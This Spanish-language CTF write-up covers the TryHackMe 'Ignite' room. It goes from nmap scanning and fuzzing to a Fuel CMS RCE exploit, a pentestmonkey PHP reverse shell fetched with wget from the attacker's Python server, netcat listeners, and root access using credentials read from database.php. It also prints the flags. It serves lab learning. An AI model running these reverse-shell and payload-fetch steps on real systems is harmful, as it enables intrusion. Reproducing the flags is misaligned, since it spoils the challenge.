# Ignite 

https://tryhackme.com/room/ignite

## NMAP

Hacemos un escaneo con `nmap` para ver las versiones también.

```
nmap -sV 10.10.98.176
```

![[Pasted image 20250204104650.png]]

Sólo escanea los puertos más comunes por defecto así que usamos la opción `-p-` para probar con todos.

Para detectar el SO y la versión del mismo usamos `-O`:

```
sudo nmap -sV -O 10.10.98.176
```
No nos da resultados y es algo normal que eso suceda.

También podemos modificar los tiempos entre los paquetes para que sea más difícil detectarlos. El modo 5 es el más agresivo y el 1 es el más "paranoico". Entre 3 y 4 es lo más normal y está en t3 por defecto.

```
sudo nmap -sV -O -T4 10.10.98.176
```

![[Pasted image 20250204105623.png]]

## Fuzzing 

Accedemos a la página web y usamos `DirBuster` para hacer fuzzing a la URL mientras seguimos inspeccionando el contenido de la página.

![[Pasted image 20250212170404.png]]

Descubrimos un login:

![[Pasted image 20250212170436.png]]

El fuzzing nos da los mismos resultados:

![[Pasted image 20250212170557.png]]

## /fuel/

Accedemos pues a `/fuel` y entramos con el usuario y contraseñas indicados.

![[Pasted image 20250212170659.png]]

Accedimos a un panel de administración del sitio web.

![[Pasted image 20250212170830.png]]

En la pestaña de `assets` podemos subir un archivo.

![[Pasted image 20250212172318.png]]

Nos aprovecharemos de esto ahora mismo.

## Reverse Shell

Usaremos la siguiente reverse shell de PHP:

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

La modificamos con la IP de la VPN de nuestro Kali y el puerto 4444:

![[Pasted image 20250212172546.png]]

La página sólo permite subir archivos .zip pero podemos hacer que se descompriman automáticamente al subirlos.



Ponemos en escucha el puerto 4444:

```
nc -lvnp 4444
```

## exploit-db

Buscamos la vulnerabilidad de "fuel CMS" y encontramos la de la versión 1.4.1 de Remote Code Execution.

![[Pasted image 20250212182655.png]]

Nos descargamos el exploit.

![[Pasted image 20250212182715.png]]

Lo ejecutamos con el siguiente comando y accedemos al sistema finalmente.

![[Pasted image 20250212182759.png]]

Aunque es una shell muy limitada actualmente, no nos permite hacer casi nada.

Buscamos pues una reverse shell de php.

![[Pasted image 20250220172524.png]]

Nos la descargamos y editamos unos parámetros. La IP es la de nuestro Kali en la VPN de Tryhackme, 10.8.3.33 y el puerto 5000.

![[Pasted image 20250220172721.png]]

Abrimos una consola de`netcat`en escucha para el puerto 5000.

```
nc -lvnp 5000 
```

![[Pasted image 20250220172838.png]]

También abrimos un servidor http con Python por el puerto 9000.

```
python3 -m http.server 9000
```

>IMPORTANTE: La reverse shell de php que vamos a utilizar tiene que estar en la misma carpeta desde la que abrimos el servidor de python.

![[Pasted image 20250220173032.png]]

Hacemos clic en "RAW" en la página de github de antes de la reverse shell de php y copiamos la URL. 

![[Pasted image 20250220173141.png]]

```
https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
```

Nos descargamos en el servidor la reverse shell que editamos.

```
wget http://10.8.3.33:9000/shell.php
```

![[Pasted image 20250220174600.png]]

![[Pasted image 20250220174621.png]]

Accedemos a la URL del archivo que hemos subido de php. La página se quedará cargando cuando se haya establecido la conexión.

![[Pasted image 20250220174734.png]]

En el puerto que abrimos en escucha con `netcat`hemos establecido la conexión.

![[Pasted image 20250220180034.png]]

Obtenemos la primera **flag**:

![[Pasted image 20250220180225.png]]

```
6470e394cbf6dab6a91682cc8585059b
```

## Escalada de privilegios

Ahora vamos a hacer una escalada de privilegios. Nos dirigimos a la siguiente ruta donde está la base de datos.

```
cd /var/www/html/fuel/application/config
```

Y mostramos el fichero `database.php`. En él están las credenciales del usuario `root`.

![[Pasted image 20250220180945.png]]

Hacemos más interactiva la terminal con el siguiente comando de python:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Accedemos ahora si al usuario `root`.

```
su root
```

Y la contraseña es `mememe`.

![[Pasted image 20250220182137.png]]

Finalmente, obtenemos la última flag que se encuentra en la carpeta `root`y en el fichero `root.txt`.

![[Pasted image 20250220182314.png]]

```
b9bbcb33e11b80be759c4e844862482d
```





























